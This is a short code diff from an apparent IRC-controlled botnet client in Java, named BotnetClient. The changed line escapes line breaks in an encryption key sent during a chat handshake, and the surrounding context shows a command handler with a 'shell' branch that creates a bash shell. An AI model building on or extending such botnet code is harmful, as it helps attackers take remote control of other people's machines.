@@ -245,7 +245,7 @@ public class BotnetClient extends PircBot {
 						m = MsgEncrypt.getInstance();
 						m.setPubParams(info);
 						m.handShake(otherKey);
-						chat.sendLine(m.getStrKey());
+						chat.sendLine(m.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
 						chat.close();
 					} else if (command.equalsIgnoreCase("shell")) {
 						//Create the bash shell
